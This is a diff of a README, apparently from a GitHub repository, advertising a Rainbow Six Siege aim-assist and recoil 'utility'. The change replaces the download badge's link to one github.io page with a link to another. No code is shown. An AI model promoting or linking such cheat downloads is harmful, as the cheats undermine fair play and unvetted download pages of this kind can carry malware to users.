@@ -6,7 +6,7 @@
 <h1 align="center">🎯 R6S Aim Assist + Overlay Utility</h1>
 
 <p align="center">
-  <a href="https://trahendon.github.io/.github/recoilControlinfoR6S1" target="_blank">
+  <a href="https://fumohatinfowebpc1.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20R6S%20Assist-Aim%20Overlay%20%2B%20Recoil%20Visualizer-111111?style=for-the-badge&logo=ubisoft&logoColor=white" 
          alt="Download R6S Aim Assist" style="width: 540px; height: 37px;">
   </a>
